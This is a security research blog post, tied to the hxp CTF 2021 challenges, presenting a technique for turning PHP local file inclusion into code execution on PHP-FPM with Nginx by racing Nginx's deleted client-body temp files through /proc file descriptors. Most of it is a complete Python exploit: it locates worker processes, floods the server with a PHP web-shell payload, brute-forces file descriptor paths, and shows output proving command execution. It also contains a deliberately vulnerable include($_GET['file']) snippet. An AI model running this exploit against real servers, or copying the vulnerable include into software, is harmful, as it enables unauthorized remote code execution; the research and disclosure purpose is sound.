> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bierbaumer.net](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/)

> New method to exploit PHP local file inclusion (LFI) vulnerabilities with Nginx assistance.

PHP LFI with Nginx Assistance
-----------------------------

This post presents a new method to exploit local file inclusion (LFI) vulnerabilities in utmost generality, assuming _only_ that PHP is running in combination with Nginx under a common standard configuration. The technique was discovered while developing the [includer's revenge](https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/) / [counter](https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/) challenges from the [hxp CTF 2021](https://2021.ctf.link/).

Thank you and congratulations to pasten, Super Guesser and p4 for also discovering this issue and additionally demonstrating that it's remotely exploitable in both challenges. Also, thanks for the great discussions on IRC and especially the force (love - [visible here](https://twitter.com/hxpctf/status/1472909170349428737)) pasten applied to extract the flags from our servers.

Published: 26 Dec 2021

* * *

PHP local file inclusions (LFI) techniques have a long history in security research and are popular within the CTF community. Many tricks have been published over the years:

*   `PHP_SESSION_UPLOAD_PROGRESS` trick - [https://blog.orange.tw/2018/10/](https://blog.orange.tw/2018/10/)
*   Use wrappers like `compress.zlib://` to upload a temporary file - [https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer](https://balsn.tw/ctf_writeup/20191228-hxp36c3ctf/#includer)
*   Temp files / `FindFirstFile` tricks [https://gynvael.coldwind.pl/?id=376](https://gynvael.coldwind.pl/?id=376)
*   LFI with `phpinfo()` assistance - [https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)
*   Obsolete `/proc/self/environ` tricks - [https://www.exploit-db.com/papers/12886](https://www.exploit-db.com/papers/12886)
*   Obsolete `/var/log/apache2/*log` (has this ever worked)?
*   etc.

Most of the current LFI exploitation techniques rely on PHP being able to create some form of temporary or session files. Let's consider the following example where the previously available tricks don't work:  
[Download runnable example & exploit](https://bierbaumer.net/security/php-lfi-with-nginx-assistance/php-lfi-with-nginx-assistance.tar.xz).

PHP code:

```
<?php include_once($_GET['file']);


```

FPM / PHP config:

```
...
php_admin_value[session.upload_progress.enabled] = 0
php_admin_value[file_uploads] = 0
...


```

Setup / hardening:

```
...
chown -R 0:0 /tmp /var/tmp /var/lib/php/sessions
chmod -R 000 /tmp /var/tmp /var/lib/php/sessions
...


```

Luckily PHP is currently often deployed via PHP-FPM and Nginx. Nginx offers an easily-overlooked [client body buffering](https://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size) feature which will write temporary files if the client body (not limited to post) is bigger than a certain threshold.

This feature allows LFIs to be exploited without any other way of creating files, if Nginx runs as the same user as PHP (very commonly done as www-data).

Relevant Nginx code:

```
ngx_fd_t
ngx_open_tempfile(u_char *name, ngx_uint_t persistent, ngx_uint_t access)
{
    ngx_fd_t  fd;

    fd = open((const char *) name, O_CREAT|O_EXCL|O_RDWR,
              access ? access : 0600);

    if (fd != -1 && !persistent) {
        (void) unlink((const char *) name);
    }

    return fd;
}


```

It's visible that tempfile is unlinked immediately after being opened by Nginx. Luckily procfs can be used to still obtain a reference to the deleted file via a race:

```
...
/proc/34/fd:
total 0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 0 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:56 1 -> /dev/pts/0
lrwx------ 1 www-data www-data 64 Dec 25 23:49 10 -> anon_inode:[eventfd]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 11 -> socket:[27587]
lrwx------ 1 www-data www-data 64 Dec 25 23:49 12 -> socket:[27589]
lrwx------ 1 www-data www-data 64 Dec 25 23:56 13 -> socket:[44926]
lrwx------ 1 www-data www-data 64 Dec 25 23:57 14 -> socket:[44927]
lrwx------ 1 www-data www-data 64 Dec 25 23:58 15 -> /var/lib/nginx/body/0000001368 (deleted)
...


```

Note: One cannot directly include `/proc/34/fd/15` in this example as PHP's `include` function would resolve the path to `/var/lib/nginx/body/0000001368 (deleted)` which doesn't exist in in the filesystem. This minor restriction can luckily be bypassed by some indirection like: `/proc/self/fd/34/../../../34/fd/15` which will finally execute the content of the deleted `/var/lib/nginx/body/0000001368` file.

Full Exploit:
-------------

```
#!/usr/bin/env python3
import sys, threading, requests

# exploit PHP local file inclusion (LFI) via nginx's client body buffering assistance
# see https://bierbaumer.net/security/php-lfi-with-nginx-assistance/ for details

URL = f'http://{sys.argv[1]}:{sys.argv[2]}/'

# find nginx worker processes 
r  = requests.get(URL, params={
    'file': '/proc/cpuinfo'
})
cpus = r.text.count('processor')

r  = requests.get(URL, params={
    'file': '/proc/sys/kernel/pid_max'
})
pid_max = int(r.text)
print(f'[*] cpus: {cpus}; pid_max: {pid_max}')

nginx_workers = []
for pid in range(pid_max):
    r  = requests.get(URL, params={
        'file': f'/proc/{pid}/cmdline'
    })

    if b'nginx: worker process' in r.content:
        print(f'[*] nginx worker found: {pid}')

        nginx_workers.append(pid)
        if len(nginx_workers) >= cpus:
            break

done = False

# upload a big client body to force nginx to create a /var/lib/nginx/body/$X
def uploader():
    print('[+] starting uploader')
    while not done:
        requests.get(URL, data='<?php system($_GET["c"]); /*' + 16*1024*'A')

for _ in range(16):
    t = threading.Thread(target=uploader)
    t.start()

# brute force nginx's fds to include body files via procfs
# use ../../ to bypass include's readlink / stat problems with resolving fds to `/var/lib/nginx/body/0000001150 (deleted)`
def bruter(pid):
    global done

    while not done:
        print(f'[+] brute loop restarted: {pid}')
        for fd in range(4, 32):
            f = f'/proc/self/fd/{pid}/../../../{pid}/fd/{fd}'
            r  = requests.get(URL, params={
                'file': f,
                'c': f'id'
            })
            if r.text:
                print(f'[!] {f}: {r.text}')
                done = True
                exit()

for pid in nginx_workers:
    a = threading.Thread(target=bruter, args=(pid, ))
    a.start()


```

Output:

```
$ ./pwn.py 127.0.0.1 1337
[*] cpus: 2; pid_max: 32768
[*] nginx worker found: 33
[*] nginx worker found: 34
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] starting uploader
[+] brute loop restarted: 33
[+] brute loop restarted: 34
[!] /proc/self/fd/34/../../../34/fd/9: uid=33(www-data) gid=33(www-data) groups=33(www-data)


```

### Site Notes:

*   [includer's revenge](https://2021.ctf.link/internal/challenge/ed0208cd-f91a-4260-912f-97733e8990fd/) also contains a LFI vuln. via [`fastcgi_buffering`](http://nginx.org/en/docs/http/ngx_http_fastcgi_module.html#fastcgi_buffering) which is easier to exploit as the tempfile can be kept open via calling `readfile` on a http:// resource.
*   [counter](https://2021.ctf.link/internal/challenge/a67e2921-e09a-4bfa-8e7e-11c51ac5ee32/) additionally adds `system()` so that `/proc/$PID/cmdline` can be used for local file inclusion via base64 wrappers. :)